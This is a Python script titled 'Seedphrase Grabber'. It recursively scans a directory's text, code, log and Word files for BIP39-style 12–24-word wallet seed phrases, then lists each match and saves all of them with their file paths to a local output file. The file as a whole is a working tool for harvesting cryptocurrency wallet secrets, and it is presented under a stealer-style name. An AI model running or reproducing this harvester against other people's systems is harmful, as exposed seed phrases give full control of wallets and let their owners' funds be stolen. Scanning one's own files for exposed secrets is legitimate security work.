
# File: crypto_threats/seedphrase_grabber.py
import os
import re
import argparse
from rich.console import Console
from rich.table import Table
from rich.progress import track
try:
    import docx
except ImportError:
    docx = None

console = Console()
# Busca 12-24 palavras (BIP39)
SEED_REGEX = re.compile(r"\b(?:[a-z]{3,10}\s+){11,23}[a-z]{3,10}\b")
EXT_TEXT = {'.txt', '.log', '.md', '.json', '.js', '.py'}
EXT_DOCX = {'.docx'}

found = []

def extract_txt(path):
    try:
        text = open(path, 'r', encoding='utf-8', errors='ignore').read()
        for m in SEED_REGEX.finditer(text):
            found.append((path, m.group(0)))
    except Exception:
        pass

def extract_docx(path):
    if not docx:
        return
    try:
        doc = docx.Document(path)
        text = '\n'.join(p.text for p in doc.paragraphs)
        for m in SEED_REGEX.finditer(text):
            found.append((path, m.group(0)))
    except Exception:
        pass

# Scan completo

def scan_dir(root: str):
    for dirpath, _, files in os.walk(root):
        for f in files:
            ext = os.path.splitext(f)[1].lower()
            path = os.path.join(dirpath, f)
            if ext in EXT_TEXT:
                extract_txt(path)
            elif ext in EXT_DOCX:
                extract_docx(path)

# Exibição final

def main(target: str = '.'):
    console.rule("[bold cyan]Seedphrase Grabber[/bold cyan]")
    scan_dir(target)
    table = Table(show_header=True)
    table.add_column("File", overflow="fold")
    table.add_column("Seed Phrase", overflow="fold")
    for path, phrase in found:
        table.add_row(path, phrase)
    console.print(table)
    # salvo
    out = os.path.join('output', 'seedphrases.txt')
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, 'w', encoding='utf-8') as f:
        for path, phrase in found:
            f.write(f"{path} | {phrase}\n")
    console.print(f"[green]✔ Found {len(found)} seed phrases. Saved to {out}[/green]")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Seedphrase Grabber")
    parser.add_argument('--dir', default='.', help='Diretório para scan')
    args = parser.parse_args()
    main(args.dir)
